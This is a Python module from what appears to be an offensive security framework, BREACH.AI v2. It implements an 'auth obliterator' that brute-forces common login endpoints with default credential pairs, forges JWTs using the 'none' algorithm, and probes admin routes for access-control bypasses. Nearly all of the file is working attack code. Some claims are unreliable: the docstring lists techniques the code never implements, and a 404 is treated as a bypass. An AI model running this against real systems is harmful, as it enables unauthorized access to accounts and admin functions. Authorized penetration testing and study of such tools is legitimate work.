"""
BREACH.AI v2 - Auth Obliterator Module

Break authentication mechanisms.
"""

import asyncio
import base64
import json
import re
from urllib.parse import urljoin

from breach.modules.base import (
    InitialAccessModule,
    ModuleConfig,
    ModuleInfo,
    register_module,
)
from breach.core.killchain import (
    BreachPhase,
    ModuleResult,
    EvidenceType,
    AccessLevel,
    Severity,
)


# Default credentials to try
DEFAULT_CREDS = [
    ("admin", "admin"),
    ("admin", "password"),
    ("admin", "123456"),
    ("root", "root"),
    ("root", "password"),
    ("test", "test"),
    ("user", "user"),
    ("guest", "guest"),
    ("admin", "admin123"),
    ("administrator", "administrator"),
]

# JWT header manipulation payloads
JWT_ATTACKS = {
    "none_alg": {"alg": "none", "typ": "JWT"},
    "hs256_weak": {"alg": "HS256", "typ": "JWT"},
}


@register_module
class AuthObliterator(InitialAccessModule):
    """
    Auth Obliterator - Break authentication mechanisms.

    Techniques:
    - Default credentials
    - Credential stuffing
    - JWT algorithm confusion
    - JWT none algorithm
    - Session fixation
    - Auth bypass via parameter manipulation
    """

    info = ModuleInfo(
        name="auth_obliterator",
        phase=BreachPhase.INITIAL_ACCESS,
        description="Authentication bypass",
        author="BREACH.AI",
        techniques=["T1078", "T1110"],  # Valid Accounts, Brute Force
        platforms=["web", "api"],
        requires_access=False,
        provides_access=True,
        max_access_level=AccessLevel.ADMIN,
    )

    async def check(self, config: ModuleConfig) -> bool:
        return bool(config.target)

    async def run(self, config: ModuleConfig) -> ModuleResult:
        self._start_execution()

        bypasses = []
        valid_creds = []

        # Find login endpoints
        login_endpoints = await self._find_login_endpoints(config.target)

        # Test default credentials
        for endpoint in login_endpoints:
            creds = await self._test_default_creds(endpoint, config)
            if creds:
                valid_creds.extend(creds)

        # Test JWT attacks if tokens present
        jwt_bypass = await self._test_jwt_attacks(config)
        if jwt_bypass:
            bypasses.append(jwt_bypass)

        # Test auth bypass endpoints
        auth_bypasses = await self._test_auth_bypass(config.target, config)
        bypasses.extend(auth_bypasses)

        # Determine access level
        access_gained = None
        if valid_creds or bypasses:
            # Check if any give admin access
            for cred in valid_creds:
                if "admin" in cred.get("username", "").lower():
                    access_gained = AccessLevel.ADMIN
                    break
            if not access_gained:
                access_gained = AccessLevel.USER

        # Add evidence
        for cred in valid_creds:
            self._add_evidence(
                evidence_type=EvidenceType.CREDENTIAL,
                description=f"Valid credentials found for {cred['endpoint']}",
                content={
                    "endpoint": cred["endpoint"],
                    "username": cred["username"],
                    "password": "***",
                    "access_level": cred.get("access_level", "unknown"),
                },
                proves="Authentication can be bypassed with known credentials",
                severity=Severity.CRITICAL,
                redact=True,
            )

        for bypass in bypasses:
            self._add_evidence(
                evidence_type=EvidenceType.API_RESPONSE,
                description=f"Authentication bypass: {bypass['type']}",
                content=bypass,
                proves="Authentication mechanism is flawed",
                severity=Severity.CRITICAL,
            )

        return self._create_result(
            success=len(valid_creds) > 0 or len(bypasses) > 0,
            action="auth_bypass",
            details=f"Found {len(valid_creds)} valid creds, {len(bypasses)} bypasses",
            access_gained=access_gained,
            credentials_found=[{"username": c["username"], "service": "web"} for c in valid_creds],
            enables_modules=["database_pillager", "secrets_extractor"] if access_gained else [],
        )

    async def _find_login_endpoints(self, target: str) -> list[str]:
        """Find login/auth endpoints."""
        endpoints = []
        paths = [
            "/api/auth/login", "/api/login", "/api/signin",
            "/auth/login", "/login", "/signin",
            "/api/auth/token", "/api/token",
            "/api/v1/auth/login", "/api/v1/login",
            "/admin/login", "/api/admin/login",
        ]

        for path in paths:
            url = urljoin(target, path)
            try:
                response = await self._safe_request("POST", url, json={}, timeout=10)
                if response and response.get("status_code") in [200, 400, 401, 422]:
                    endpoints.append(url)
            except Exception:
                pass

        return endpoints

    async def _test_default_creds(self, endpoint: str, config: ModuleConfig) -> list[dict]:
        """Test default credentials."""
        valid = []

        for username, password in DEFAULT_CREDS:
            try:
                response = await self._safe_request(
                    "POST", endpoint,
                    json={"username": username, "password": password},
                    timeout=10,
                )

                if response:
                    status = response.get("status_code", 0)
                    text = response.get("text", "").lower()

                    # Check for successful login indicators
                    if status == 200 and any(
                        kw in text for kw in ["token", "session", "success", "welcome", "dashboard"]
                    ):
                        valid.append({
                            "endpoint": endpoint,
                            "username": username,
                            "password": password,
                            "access_level": "admin" if "admin" in text else "user",
                        })
                        break  # Found valid creds, stop testing

            except Exception:
                continue

        return valid

    async def _test_jwt_attacks(self, config: ModuleConfig) -> dict:
        """Test JWT algorithm attacks."""
        # Look for JWT in cookies or headers
        jwt_pattern = r"eyJ[a-zA-Z0-9_-]+\.eyJ[a-zA-Z0-9_-]+\.[a-zA-Z0-9_-]+"

        for token_source in [config.cookies, config.headers]:
            for key, value in token_source.items():
                if re.match(jwt_pattern, str(value)):
                    # Found JWT, try none algorithm attack
                    try:
                        parts = value.split(".")
                        header = json.loads(base64.urlsafe_b64decode(parts[0] + "=="))
                        payload = json.loads(base64.urlsafe_b64decode(parts[1] + "=="))

                        # Create none algorithm token
                        new_header = {"alg": "none", "typ": "JWT"}
                        new_token = (
                            base64.urlsafe_b64encode(json.dumps(new_header).encode()).decode().rstrip("=") +
                            "." +
                            base64.urlsafe_b64encode(json.dumps(payload).encode()).decode().rstrip("=") +
                            "."
                        )

                        # Test with modified token
                        test_cookies = config.cookies.copy()
                        test_cookies[key] = new_token

                        response = await self._safe_request(
                            "GET", urljoin(config.target, "/api/user"),
                            cookies=test_cookies,
                            timeout=10,
                        )

                        if response and response.get("status_code") == 200:
                            return {
                                "type": "jwt_none_algorithm",
                                "description": "JWT accepts none algorithm",
                                "token_key": key,
                            }

                    except Exception:
                        pass

        return {}

    async def _test_auth_bypass(self, target: str, config: ModuleConfig) -> list[dict]:
        """Test for authentication bypass vulnerabilities."""
        bypasses = []

        # Test protected endpoint without auth
        protected_paths = ["/api/admin", "/api/users", "/api/config", "/admin", "/dashboard"]

        for path in protected_paths:
            url = urljoin(target, path)
            try:
                # First check if it requires auth
                response = await self._safe_request("GET", url, timeout=10)
                if response and response.get("status_code") == 401:
                    # Try with ID parameter (auth bypass pattern)
                    for test_id in ["1", "admin", "test"]:
                        bypass_url = f"{url}/{test_id}"
                        bypass_response = await self._safe_request("GET", bypass_url, timeout=10)

                        if bypass_response and bypass_response.get("status_code") in [200, 404]:
                            # 404 still indicates the route exists without auth
                            bypasses.append({
                                "type": "route_bypass",
                                "description": f"{path} -> 401, {path}/{{id}} -> {bypass_response.get('status_code')}",
                                "endpoint": bypass_url,
                            })
                            break

            except Exception:
                continue

        return bypasses
